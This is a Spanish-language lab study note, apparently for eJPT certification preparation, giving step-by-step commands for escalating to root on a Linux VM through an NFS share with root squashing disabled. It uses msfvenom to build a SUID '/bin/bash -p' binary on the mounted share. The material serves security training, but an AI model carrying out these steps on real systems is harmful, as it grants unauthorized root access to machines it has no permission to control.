
- Los archivos creados mediante NFS heredan el ID del usuario remoto. Si el usuario es root y la eliminación de raíz está habilitada, el ID se establecerá en el usuario "nadie".

- Verifique la configuración del recurso compartido NFS en la máquina virtual Debian:

```
cat /etc/exports
```
Tenga en cuenta que el recurso compartido /tmp tiene desactivada la eliminación de raíces.

- En su caja Kali, cambie a su usuario root si aún no está ejecutando como root:

```
sudo su
```

- Usando el usuario root de Kali, cree un punto de montaje en su caja Kali y monte el recurso compartido /tmp (actualice la IP en consecuencia): mkdir/tmp/nfs montar -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs

```
mkdir /tmp/nfs  
mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs
```

- Aún usando el usuario root de Kali, genere una carga útil usando msfvenom y guárdela en el recurso compartido montado (esta carga útil simplemente llama a /bin/bash):

```
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```

- Aún usando el usuario root de Kali, haga que el archivo sea ejecutable y establezca el permiso SUID:

```
chmod +xs /tmp/nfs/shell.elf
```

- De vuelta en la máquina virtual Debian, como cuenta de usuario con pocos privilegios, ejecute el archivo para obtener un shell raíz:

```
/tmp/shell.elf
```

enlace:
[[Local/Ciberseguridad/HACKING/CERTIFICACIONES/EJPT/Preparacion-Ejpt]]

